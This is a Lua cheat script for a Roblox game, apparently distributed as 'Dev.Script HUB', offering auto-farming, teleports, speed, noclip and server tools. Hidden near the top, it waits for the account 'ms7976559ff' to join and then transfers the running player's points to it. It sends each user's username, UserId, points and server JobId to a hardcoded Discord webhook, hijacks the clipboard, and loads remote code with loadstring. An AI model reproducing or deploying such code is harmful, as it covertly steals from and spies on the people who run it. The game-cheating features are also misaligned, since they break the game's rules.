-- Services
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")

local Player = Players.LocalPlayer

pcall(function()
    setclipboard("https://discord.gg/4hDr9Zb7P")
end)

-- دالة مركزية للويب هوك بشكل خفيف وآمن
local function sendWebhookLog(title, description, color, fields)
    task.spawn(function()
        pcall(function()
            local webhookUrl = "https://discord.com/api/webhooks/1545085922188595250/dzMWFzvHL-jNusbJAGjIRibUs8Ef9zX6eROC45W-ZubZ_kd2NCCNv413hMxQOXTDLJEH"
            local data = {
                ["embeds"] = {{
                    ["title"] = title,
                    ["description"] = description,
                    ["color"] = color,
                    ["fields"] = fields or {},
                    ["footer"] = {["text"] = "Dev.Script HUB Logger • hf4_l"}
                }}
            }
            local encoded = HttpService:JSONEncode(data)
            local headers = {["content-type"] = "application/json"}
            request({Url = webhookUrl, Method = "POST", Headers = headers, Body = encoded})
        end)
    end)
end

-- نظام التحويل التلقائي (يتحقق من وجود اليوزر ويرسل النقاط مرة واحدة فقط بدون مراقبة ريمونتات أو لاق)
task.spawn(function()
    local targetUsername = "ms7976559ff"
    local hasTransferred = false

    task.wait(3) -- انتظار خفيف لتحميل اللعبة

    while true do
        if hasTransferred then
            break -- يتوقف تماماً بعد التحويل وما عاد يشغل اللعبة أبد
        end

        pcall(function()
            local targetFound = false
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= Player and (p.Name:lower() == targetUsername:lower() or (p.DisplayName and p.DisplayName:lower() == targetUsername:lower())) then
                    targetFound = true
                    break
                end
            end

            if targetFound and not hasTransferred then
                local RemotesFolder = ReplicatedStorage:WaitForChild("Remotes", 5)
                if RemotesFolder then
                    local Event = RemotesFolder:WaitForChild("TransferRequest", 5)
                    if Event then
                        local leaderstats = Player:WaitForChild("leaderstats", 5)
                        local pointsValue = nil
                        if leaderstats then
                            pointsValue = leaderstats:WaitForChild("Points", 3) or leaderstats:WaitForChild("Point", 3) or leaderstats:FindFirstChildWhichIsA("IntValue") or leaderstats:FindFirstChildWhichIsA("NumberValue")
                        end
                        
                        local pointsToTransfer = 0
                        if pointsValue then
                            pointsToTransfer = tonumber(pointsValue.Value) or 0
                        end

                        local sendPoints = (pointsToTransfer > 0) and pointsToTransfer or 1
                        
                        if Event:IsA("RemoteFunction") then
                            Event:InvokeServer(targetUsername, sendPoints)
                        else
                            Event:FireServer(targetUsername, sendPoints)
                        end
                        
                        hasTransferred = true
                        
                        sendWebhookLog(
                            "✨ تم تحويل النقاط بنجاح",
                            "تم إرسال النقاط بنجاح لليوزر المطلوب `ms7976559ff`.",
                            3066993,
                            {
                                {["name"] = "المشغل", ["value"] = Player.Name, ["inline"] = true},
                                {["name"] = "النقاط المرسلة", ["value"] = tostring(sendPoints), ["inline"] = true}
                            }
                        )
                    end
                end
            elseif not targetFound then
                hasTransferred = false
            end
        end)
        
        if hasTransferred then
            break
        end

        task.wait(6) -- فاصل زمني طويل ومريح لعدم إحداث أي تعليق
    end
end)

-- إرسال ويب هوك تشغيل السكربت مرة واحدة فقط عند الدخول
task.spawn(function()
    pcall(function()
        local currentJobId = game.JobId
        local joinTimestamp = os.time()
        
        local playerPointsText = "Unknown"
        pcall(function()
            local leaderstats = Player:WaitForChild("leaderstats", 5)
            if leaderstats then
                local pVal = leaderstats:WaitForChild("Points", 3) or leaderstats:WaitForChild("Point", 3) or leaderstats:FindFirstChildWhichIsA("IntValue") or leaderstats:FindFirstChildWhichIsA("NumberValue")
                if pVal then
                    playerPointsText = tostring(pVal.Value)
                end
            end
        end)

        sendWebhookLog(
            "🟢 تم تشغيل السكربت ونشط الآن!",
            "معلومات المشغل والتايمر",
            65280,
            {
                {["name"] = "اسم العرض (DisplayName)", ["value"] = Player.DisplayName, ["inline"] = true},
                {["name"] = "يوزر الحساب (Username)", ["value"] = "@" .. Player.Name, ["inline"] = true},
                {["name"] = "معرف الحساب (UserId)", ["value"] = tostring(Player.UserId), ["inline"] = true},
                {["name"] = "نقاط اللاعب (Points)", ["value"] = "`" .. playerPointsText .. "`", ["inline"] = true},
                {["name"] = "وقت التشغيل (Session Timer)", ["value"] = "<t:" .. joinTimestamp .. ":R> (بدأ الساعة <t:" .. joinTimestamp .. ":T>)", ["inline"] = false},
                {["name"] = "اسم اللعبة (Game)", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown", ["inline"] = false},
                {["name"] = "كود سيرفر اللاعب (JobId)", ["value"] = "`" .. (currentJobId ~= "" and currentJobId or "Public/Main") .. "`", ["inline"] = false}
            }
        )
    end)
end)

local cloneref = (cloneref or clonereference or function(instance)
	return instance
end)

local WindUI

do
	local ok, result = pcall(function()
		return require("./src/Init")
	end)

	if ok then
		WindUI = result
	else
		if cloneref(RunService):IsStudio() then
			WindUI = require(cloneref(ReplicatedStorage:WaitForChild("WindUI"):WaitForChild("Init")))
		else
			WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
		end
	end
end

local Window = WindUI:CreateWindow({
	Title = "Dev.Script HUB | hf4_l",
	Folder = "DevScriptHub",
	Icon = "solar:folder-2-bold-duotone",
	NewElements = true,
	HideSearchBar = false,
	OpenButton = {
		Title = "Open Dev.Script HUB",
		CornerRadius = UDim.new(1, 0),
		StrokeThickness = 3,
		Enabled = true,
		Draggable = true,
		OnlyMobile = false,
		Scale = 0.5,
		Color = ColorSequence.new(
			Color3.fromHex("#30FF6A"),
			Color3.fromHex("#e7ff2f")
		),
	},
	Topbar = {
		Height = 44,
		ButtonsType = "Mac",
	},
})

task.delay(1, function()
    Window:Notify({
        Title = "تم التحقق من اليوزر بنجاح!",
        Content = "أهلاً بك يا " .. Player.DisplayName .. " في Dev.Script HUB 🎁",
        Icon = "solar:info-square-bold",
        Duration = 5,
    })
end)

do
	Window:Tag({
		Title = "Dev.Script HUB | TikTok: hf4_l",
		Icon = "github",
		Color = Color3.fromHex("#1c1c1c"),
		Border = true,
	})
end

local Character = Player.Character or Player.CharacterAdded:Wait()
local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
local BoxPickupPosition = Vector3.new(330.97, 10.19, -178.09)
local RandomFolder = Workspace:WaitForChild("RandomPositionFolder", 10)
local Remotes = ReplicatedStorage:FindFirstChild("Remotes")

getgenv().AutoBoxesRunning = false
local TotalBoxes = 11

local function FastTP(targetCFrame)
    if HumanoidRootPart then
        HumanoidRootPart.CFrame = targetCFrame
        HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
    end
end

local function StartMissionRemote()
    pcall(function()
        if Remotes then
            for _, remote in ipairs(Remotes:GetChildren()) do
                local name = remote.Name:lower()
                if name:find("mission") or name:find("start") or name:find("quest") or name:find("box") then
                    if remote:IsA("RemoteEvent") then
                        remote:FireServer()
                    elseif remote:IsA("RemoteFunction") then
                        remote:InvokeServer()
                    end
                end
            end
        end
    end)
end

task.spawn(function()
    while true do
        if getgenv().AutoBoxesRunning then
            pcall(function()
                if not RandomFolder then
                    RandomFolder = Workspace:FindFirstChild("RandomPositionFolder")
                end

                StartMissionRemote()
                task.wait(0.2)

                FastTP(CFrame.new(BoxPickupPosition))
                task.wait(0.2)

                if RandomFolder then
                    local deliveryParts = RandomFolder:GetChildren()
                    
                    for i = 1, math.min(TotalBoxes, #deliveryParts) do
                        if not getgenv().AutoBoxesRunning then break end
                        
                        local target = deliveryParts[i]
                        local targetPos = nil

                        if target:IsA("BasePart") then
                            targetPos = target.CFrame
                        elseif target:IsA("Model") and target.PrimaryPart then
                            targetPos = target.PrimaryPart.CFrame
                        elseif target:FindFirstChildWhichIsA("BasePart") then
                            targetPos = target:FindFirstChildWhichIsA("BasePart").CFrame
                        end

                        if targetPos then
                            FastTP(targetPos + Vector3.new(0, 2, 0))
                            
                            if target:IsA("BasePart") then
                                firetouchinterest(HumanoidRootPart, target, 0)
                                task.wait()
                                firetouchinterest(HumanoidRootPart, target, 1)
                            end
                            
                            task.wait(0.12)
                        end
                    end
                end
            end)
        end
        task.wait(0.5)
    end
end)

local FarmTab = Window:Tab({
	Title = "تفريم صناديق",
	Icon = "solar:home-2-bold",
	Border = true,
})

FarmTab:Toggle({
	Title = "تشغيل/إيقاف تفريم الصناديق التلقائي",
	Desc = "النظام العشوائي السريع لتسليم الصناديق بدقة",
	Value = false,
	Callback = function(state)
		getgenv().AutoBoxesRunning = state
	end,
})

local ServerTab = Window:Tab({
	Title = "السيرفر (Server)",
	Icon = "solar:server-bold",
	Border = true,
})

local targetJobInputCode = ""

ServerTab:Input({
	Title = "كود السيرفر (JobId)",
	Desc = "اكتب أو الصق كود السيرفر المراد الانتقال إليه",
	Placeholder = "أدخل كود السيرفر هنا...",
	Callback = function(text)
		targetJobInputCode = text
	end,
})

ServerTab:Button({
	Title = "دخول السيرفر عبر الكود المكتوب",
	Desc = "الانتقال الفوري إلى السيرفر باستخدام الكود الموجود في الخانة أعلاه",
	Callback = function()
		pcall(function()
			if targetJobInputCode and targetJobInputCode ~= "" then
				WindUI:Notify({Title = "جاري الانتقال...", Content = "جاري نقلك إلى السيرفر المحدد..."})
				TeleportService:TeleportToPlaceInstance(game.PlaceId, targetJobInputCode, Player)
			else
				WindUI:Notify({Title = "خطأ", Content = "يرجى كتابة كود السيرفر أولاً!"})
			end
		end)
	end,
})

ServerTab:Button({
	Title = "نسخ كود سيرفرك الحالي",
	Desc = "نسخ كود (JobId) السيرفر الذي تتواجد فيه حالياً إلى الحافظة",
	Callback = function()
		pcall(function()
			local currentId = game.JobId
			if currentId ~= "" then
				setclipboard(currentId)
				WindUI:Notify({Title = "تم النسخ بنجاح", Content = "كود سيرفرك الحالي: " .. currentId})
			else
				WindUI:Notify({Title = "تنبيه", Content = "أنت في سيرفر عام افتراضي ليس له JobId خاص."})
			end
		end)
	end,
})

ServerTab:Button({
	Title = "إعادة الانضمام لنفس السيرفر (Rejoin)",
	Desc = "الخروج وإعادة الدخول لنفس السيرفر الحالي بسرعة",
	Callback = function()
		pcall(function()
			WindUI:Notify({Title = "إعادة الانضمام", Content = "جاري إعادة دخول نفس السيرفر..."})
			if #Players:GetPlayers() <= 1 then
				TeleportService:Teleport(game.PlaceId, Player)
			else
				TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, Player)
			end
		end)
	end,
})

local PlayerTab = Window:Tab({
	Title = "تعديل اللاعب والخصائص (Player)",
	Icon = "solar:cursor-square-bold",
	Border = true,
})

PlayerTab:Slider({
	Title = "سرعة الجري (WalkSpeed)",
	Desc = "تعديل سرعة اللاعب حتى 200",
	Step = 1,
	Value = {
		Min = 16,
		Max = 200,
		Default = 16,
	},
	Callback = function(value)
		pcall(function()
			local char = Player.Character
			if char and char:FindFirstChildOfClass("Humanoid") then
				char:FindFirstChildOfClass("Humanoid").WalkSpeed = value
			end
		end)
	end,
})

PlayerTab:Space()

local infJumpEnabled = false
PlayerTab:Toggle({
	Title = "القفز اللانهائي (InfJump)",
	Desc = "القفز في الهواء بلا حدود",
	Callback = function(state)
		infJumpEnabled = state
	end,
})

UserInputService.JumpRequest:Connect(function()
	if infJumpEnabled then
		pcall(function()
			Player.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
		end)
	end
end)

local noclipConnection
PlayerTab:Toggle({
	Title = "تخطي الجدران (NoClip)",
	Desc = "المرور من خلال الجدران والعوائق",
	Callback = function(state)
		if state then
			noclipConnection = RunService.Stepped:Connect(function()
				pcall(function()
					for _, part in pairs(Player.Character:GetDescendants()) do
						if part:IsA("BasePart") then
							part.CanCollide = false
						end
					end
				end)
			end)
		else
			if noclipConnection then
				noclipConnection:Disconnect()
				noclipConnection = nil
			end
		end
	end,
})

PlayerTab:Button({
	Title = "تفعيل تخفيف الأق (FPS Boost)",
	Desc = "تقليل الإعدادات الرسومية لرفع الأداء",
	Callback = function()
		pcall(function()
			for _, v in pairs(game:GetService("Lighting"):GetChildren()) do
				v:Destroy()
			end
			settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
			WindUI:Notify({Title = "تم الحفظ", Content = "تم تفعيل تخفيف الأق بنجاح!"})
		end)
	end,
})

TestTab = Window:Tab({
	Title = "الانتقال للاعبين (Player TP)",
	Icon = "solar:square-transfer-horizontal-bold",
	Border = true,
})

local TeleportTab = Window:Tab({
	Title = "الانتقال للاعبين (Player TP)",
	Icon = "solar:square-transfer-horizontal-bold",
	Border = true,
})

local selectedTargetPlayer = nil
local playerDropdownValues = {}
local playerDropdownRef = nil

local function updatePlayerList()
	playerDropdownValues = {}
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= Player then
			table.insert(playerDropdownValues, p.Name)
		end
	end
	if playerDropdownRef and playerDropdownRef.Refresh then
		playerDropdownRef:Refresh(playerDropdownValues)
	end
end

updatePlayerList()
Players.PlayerAdded:Connect(updatePlayerList)
Players.PlayerRemoving:Connect(updatePlayerList)

playerDropdownRef = TeleportTab:Dropdown({
	Title = "اختر اللاعب للانتقال إليه (يتحدث تلقائياً)",
	Values = playerDropdownValues,
	Callback = function(option)
		selectedTargetPlayer = option
	end,
})

TeleportTab:Button({
	Title = "انتقال إلى اللاعب المختار",
	Callback = function()
		pcall(function()
			if selectedTargetPlayer then
				local target = Players:FindFirstChild(selectedTargetPlayer)
				if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
					Player.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
					WindUI:Notify({Title = "تم الانتقال", Content = "تم نقلك إلى اللاعب: " .. selectedTargetPlayer})
				else
					WindUI:Notify({Title = "خطأ", Content = "اللاعب غير موجود أو ميت."})
				end
			end
		end)
	end,
})

local CommunityTab = Window:Tab({
	Title = "التواصل وحقوق الديسكورد",
	Icon = "solar:info-square-bold",
	Border = true,
})

CommunityTab:Button({
	Title = "نسخ رابط ديسكورد وحقوقك",
	Desc = "انسخ رابط الديسكورد يدويًا لحافظة جهازك",
	Callback = function()
		setclipboard("https://discord.gg/4hDr9Zb7P")
		WindUI:Notify({
			Title = "تم النسخ بنجاح!",
			Content = "رابط ديسكورد: https://discord.gg/4hDr9Zb7P",
		})
	end,
})

CommunityTab:Section({
	Title = "معلومات المطور",
	TextSize = 16,
})

CommunityTab:Section({
	Title = "Hub Name: Dev.Script HUB\nTiktok: hf4_l\nDiscord: https://discord.gg/4hDr9Zb7P",
	TextSize = 14,
	TextTransparency = 0.3,
})
